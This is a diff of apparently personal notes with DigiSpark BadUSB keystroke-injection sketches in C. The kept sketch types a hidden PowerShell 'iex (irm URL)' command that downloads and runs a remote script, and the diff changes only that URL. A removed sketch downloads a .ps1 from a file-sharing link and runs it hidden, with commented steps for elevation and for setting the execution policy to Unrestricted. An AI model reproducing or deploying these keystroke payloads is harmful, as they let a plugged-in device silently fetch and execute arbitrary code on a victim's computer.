@@ -33,67 +33,17 @@ void loop() {
   // Writes the command
   DigiKeyboard.print("powershell -w h ");
   DigiKeyboard.print("iex (irm \"");
-  DigiKeyboard.print("https://raw.githubusercontent.com/msr8/attiny85/main/Shell%20Scripts/powershell/speak.ps1");  // LINK HERE
+  DigiKeyboard.print("https://raw.githubusercontent.com/Prutserdt/dotfiles/master/Stack/Code/Powershell/script.ps1");  // LINK HERE
   DigiKeyboard.print("\")");
   // Enters it
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-
-
 
   for (;;) {/* Stops the loop */}
 }
 #+end_src
 
-#+RESULTS:
 
-werkt niet goed:
-#+begin_src C
-//This DigiSpark scripts downloads and executes a powershell script in hidden mode.
-// https://github.com/CedArctic/DigiSpark-Scripts/tree/master/Execute_Powershell_Script
-#include "DigiKeyboard.h"
-void setup() {
-}
 
-void loop() {
-  DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("powershell");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  //DigiKeyboard.delay(500);
-  DigiKeyboard.delay(1000); //changed WAEL
-  DigiKeyboard.print("$client = new-object System.Net.WebClient");
-  DigiKeyboard.delay(500); //changed WAEL
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("$client.DownloadFile(\"https://icefly.stackstorage.com/s/ygwhdjHFLOBog9YI\" , \"script.ps1\")");
-  // not long enough: DigiKeyboard.delay(1000);
-  DigiKeyboard.delay(2000); //changed WAEL
-  DigiKeyboard.sendKeyStroke(KEY_ENTER); //changed WAEL
-  DigiKeyboard.delay(500); //changed WAEL
-  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT | KEY_R);
-  DigiKeyboard.delay(750);
-  //If the system hasn't been configured to run scripts, uncomment the lines bellow
-  //DigiKeyboard.print("powershell Start-Process cmd -Verb runAs");
-  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  //DigiKeyboard.delay(750);
-  //DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
-  //DigiKeyboard.delay(750);
-  //DigiKeyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
-  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  //DigiKeyboard.delay(750);
-  DigiKeyboard.print("powershell.exe -windowstyle hidden -File %USERPROFILE%\\script.ps1");
-  DigiKeyboard.delay(500); //changed WAEL
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  for (;;) {
-    /*empty*/
-  }
-
-}
-#+end_src
-
-#+RESULTS:
 
 
 * script.ps1
